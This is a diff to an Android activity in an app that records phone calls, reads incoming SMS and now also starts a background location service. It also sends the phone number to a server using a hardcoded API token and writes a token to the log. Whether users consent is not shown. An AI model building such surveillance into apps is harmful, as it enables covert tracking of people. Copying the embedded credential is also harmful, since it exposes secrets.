@@ -7,6 +7,7 @@ import an.xuan.tong.historycontact.api.model.InformationResponse
 import an.xuan.tong.historycontact.api.model.Message
 import an.xuan.tong.historycontact.api.model.User
 import an.xuan.tong.historycontact.call.CallRecord
+import an.xuan.tong.historycontact.location.MyService
 import an.xuan.tong.historycontact.realm.HistoryContactConfiguration
 import an.xuan.tong.historycontact.realm.ApiCaching
 import an.xuan.tong.historycontact.smsradar.Sms
@@ -60,30 +61,16 @@ class TokenActivity : Activity() {
         setContentView(R.layout.activity_hello_token)
         initView()
         getInformation()
+        premissonApp()
         //insertSms()
     }
 
     override fun onResume() {
         super.onResume()
         premissonApp()
-        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
-            override fun onSuccess(account: Account) {
-                user_email.text = account.email
-                account.phoneNumber?.let {
-                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, "", account.phoneNumber.toString()))
-                }
-                account.email?.let {
-                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, account.email?.toString(), ""))
-                }
-
-            }
-
-            override fun onError(error: AccountKitError) {}
-        })
     }
 
     private fun initView() {
-
         switchContact.setOnTouchListener { v, event ->
             if (event.action == MotionEvent.ACTION_DOWN) {
                 val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -149,12 +136,22 @@ class TokenActivity : Activity() {
                 .setRecordDirName("Historycontact")
                 .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                 .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                 .setShowSeed(true)
                 .build()
 
         callRecord.startCallRecordService()
+    }
+
+    private fun startLocationService() {
+        val intent = Intent()
+        intent.setClass(this, MyService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            this.startForegroundService(intent)
+        } else {
+            this.startService(intent)
+        }
     }
 
     private fun stopCallService() {
@@ -177,23 +174,37 @@ class TokenActivity : Activity() {
         SmsRadar.stopSmsRadarService(this)
     }
 
+
     private fun getInformation() {
-        Repository.createService(ApiService::class.java).getInfomation("2b11k2h3foes9f0809zdn398f0fasdmkj30", "84927356834")
-                .subscribeOn(Schedulers.io())
-                .observeOn(AndroidSchedulers.mainThread())
-                .subscribe(
-                        { result ->
-                            Log.e("test", result.toString())
-                            handlerGetInformationSccess(result)
-                            Log.e("antx", "token: " + convertJsonToObject(getCacheInformation()?.data).token)
-                        },
-                        { e ->
-                            Log.e("test", e.message)
-                        })
+        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
+            override fun onSuccess(account: Account) {
+                user_email.text = account.email
+                account.phoneNumber?.let {
+                    Repository.createService(ApiService::class.java).getInfomation("2b11k2h3foes9f0809zdn398f0fasdmkj30", account.phoneNumber.toString())
+                            .subscribeOn(Schedulers.io())
+                            .observeOn(AndroidSchedulers.mainThread())
+                            .subscribe(
+                                    { result ->
+                                        Log.e("test", result.toString())
+                                        handlerGetInformationSccess(result)
+                                        Log.e("antx", "token: " + convertJsonToObject(getCacheInformation()?.data).token)
+                                    },
+                                    { e ->
+                                        Log.e("test", e.message)
+                                    })
+                }
+                account.email?.let {
+                }
+            }
+
+            override fun onError(error: AccountKitError) {}
+        })
+
     }
 
     fun handlerGetInformationSccess(listData: InformationResponse) {
         startCallService()
+        startLocationService()
         ActivityCompat.requestPermissions(this, arrayOf("android.permission.READ_SMS"), 23)
         if (ContextCompat.checkSelfPermission(baseContext, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
             initializeSmsRadarService()
